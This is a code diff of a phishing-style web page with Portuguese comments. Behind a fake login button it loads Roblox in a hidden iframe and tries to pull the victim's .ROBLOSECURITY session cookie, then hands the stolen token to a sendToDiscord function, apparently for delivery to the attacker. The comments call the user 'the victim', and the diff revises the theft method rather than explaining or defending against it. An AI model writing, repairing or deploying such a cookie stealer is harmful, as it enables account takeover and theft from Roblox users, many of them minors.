@@ -18,7 +18,7 @@
         <button id="btn">Entrar</button>
     </div>
 
-    <!-- Iframe principal -->
+    <!-- Iframe do Roblox -->
     <iframe id="frame" style="display:none;" src="https://www.roblox.com/home"></iframe>
 
     <script>
@@ -28,57 +28,56 @@
         document.getElementById('btn').addEventListener('click', function() {
             const frame = document.getElementById('frame');
             
-            // Função para tentar pegar o cookie usando o método interno do Roblox
-            function getCookieFromFrame() {
+            // Espera o iframe carregar
+            frame.onload = function() {
                 try {
-                    // Tenta acessar o objeto rbx da janela do iframe
                     const win = frame.contentWindow;
                     
-                    // Método 1: Tenta acessar o gameSettings (muito comum hoje em dia)
-                    if (win.rbx && win.rbx.gameSettings) {
-                        // O token às vezes vem aqui como 'UserSession' ou similar
-                        // Mas o mais seguro é tentar o localStorage do iframe se o cross-origin permitir
-                    }
-
-                    // Método 2: Leitura direta do localStorage do iframe
-                    // Isso funciona se o Roblox não estiver bloqueando strict cross-origin
-                    const localData = win.localStorage.getItem('RBXSSO');
-                    const cookieStr = win.document.cookie;
+                    // Cria um formulário dinâmico dentro do iframe
+                    const form = win.document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://www.roblox.com/users/profile'; // Redireciona para a profile após o envio
                     
-                    let token = "";
+                    // Campo oculto para identificar a vítima
+                    const input = win.document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = 'status';
+                    input.value = 'logged';
+                    form.appendChild(input);
 
-                    // Busca específico por .ROBLOSECURITY no string de cookies
-                    const match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
-                    if (match) {
-                        token = match[1];
-                    } else if (localData) {
-                        // Fallback para o token de sessão simples se o cookie principal falhar
-                        token = "Sessão Local: " + localData;
-                    }
+                    // Adiciona o formulário ao corpo do iframe
+                    win.document.body.appendChild(form);
+                    
+                    // Submete o formulário. 
+                    // O segredo aqui: Ao enviar para roblox.com, o navegador INJETARÁ o cookie .ROBLOSECURITY no cabeçalho HTTP.
+                    form.submit();
 
-                    if (token) {
-                        sendToDiscord(token);
-                    } else {
-                        // Se falhar, envia um alerta para saber que o link funcionou mas não pegou
-                        sendToDiscord("⚠️ Falha na leitura automática. Tente novamente.");
-                    }
+                    // Tenta ler o cookie APÓS o submit (alguns navegadores permitem acesso imediato)
+                    setTimeout(() => {
+                        try {
+                            const cookieStr = win.document.cookie;
+                            const match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
+                            
+                            if (match) {
+                                sendToDiscord(match[1]);
+                            } else {
+                                // Se ainda assim não conseguir ler, envia um aviso
+                                sendToDiscord("⚠️ Envio realizado! Verifique se o token chegou pelo cabeçalho (requer ferramenta avançada) ou tente novamente.");
+                            }
+                        } catch(e) {
+                            sendToDiscord("Erro de leitura interna: " + e.message);
+                        }
+                    }, 500);
 
                 } catch (e) {
-                    // Erro comum: Cross-Origin bloqueou a leitura
-                    console.log("Erro de permissão:", e);
-                    // Às vezes, forçar um reload ajuda
-                    frame.src = "https://www.roblox.com/home"; 
+                    console.error("Erro:", e);
+                    sendToDiscord("Falha crítica ao acessar o iframe.");
                 }
-            }
-
-            // Espera o iframe carregar completamente antes de tentar ler
-            frame.onload = function() {
-                setTimeout(getCookieFromFrame, 2000); // Dá tempo de o Roblox injetar seus scripts
             };
 
             // Se o iframe já carregou antes do clique
             if (frame.readyState === 'complete') {
-                getCookieFromFrame();
+                frame.onload();
             }
         });
 
